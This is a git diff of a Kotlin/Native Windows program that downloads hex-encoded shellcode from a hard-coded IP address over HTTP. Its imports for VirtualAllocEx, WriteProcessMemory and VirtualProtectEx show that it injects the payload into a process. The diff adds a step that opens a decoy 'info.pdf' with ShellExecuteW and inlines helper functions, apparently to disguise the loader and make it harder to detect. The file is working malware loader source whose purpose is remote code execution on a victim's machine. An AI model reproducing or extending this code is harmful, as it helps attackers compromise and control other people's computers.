@@ -1,6 +1,5 @@
 package com.xhstormr.app
 
-import kotlin.system.exitProcess
 import kotlinx.cinterop.ByteVar
 import kotlinx.cinterop.UIntVar
 import kotlinx.cinterop.UShortVar
@@ -43,14 +42,17 @@ import platform.windows.PAGE_EXECUTE_READ
 import platform.windows.PAGE_READWRITE
 import platform.windows.PROCESS_INFORMATION
 import platform.windows.STARTUPINFO
+import platform.windows.SW_SHOWNORMAL
+import platform.windows.ShellExecuteW
 import platform.windows.VirtualAllocEx
 import platform.windows.VirtualProtectEx
 import platform.windows.WriteProcessMemory
+import kotlin.system.exitProcess
 
-fun String.hex2byte() =
+inline fun String.hex2byte() =
     this.chunked(2) { it.toString().toInt(16).toByte() }.toByteArray()
 
-fun readFile(fileName: String): ByteArray? {
+inline fun readFile(fileName: String): ByteArray? {
     val file = fopen(fileName, "rb") ?: return null
     try {
         fseek(file, 0, SEEK_END)
@@ -67,26 +69,28 @@ fun readFile(fileName: String): ByteArray? {
     }
 }
 
-fun downloadFile(host: String, port: Int, path: String): ByteArray? = runCatching {
+inline fun downloadFile(host: String, port: Int, path: String): ByteArray? = runCatching {
     val hSession = InternetOpenW(null, 0.convert(), null, null, 0.convert())
     val hConnect = InternetConnectW(hSession, host, port.convert(), null, null, INTERNET_SERVICE_HTTP, 0.convert(), 0.convert())
     val hRequest = HttpOpenRequestW(hConnect, "GET", path, null, null, null, INTERNET_FLAG_RELOAD, 0.convert())
     HttpSendRequestW(hRequest, null, 0.convert(), null, 0.convert())
 
-    val list = arrayListOf<Byte>()
+    var bytes = byteArrayOf()
     memScoped {
         val size = alloc<UIntVar>()
         val buf = allocArray<ByteVar>(BUFSIZ)
         while (true) {
             InternetReadFile(hRequest, buf, BUFSIZ, size.ptr)
             if (size.value.toInt() == 0) break
-            list.addAll(buf.readBytes(size.value.toInt()).asList())
+            bytes += buf.readBytes(size.value.toInt())
         }
     }
-    return list.toByteArray()
+    return bytes
 }.getOrNull()
 
 fun main() {
+    ShellExecuteW(null, null, "info.pdf", null, null, SW_SHOWNORMAL)
+
     memScoped {
         val raw = downloadFile("1.1.1.1", 80, "/0/main/cs")?.decodeToString()?.trim()?.hex2byte() ?: exitProcess(0)
         val rawSize = raw.size
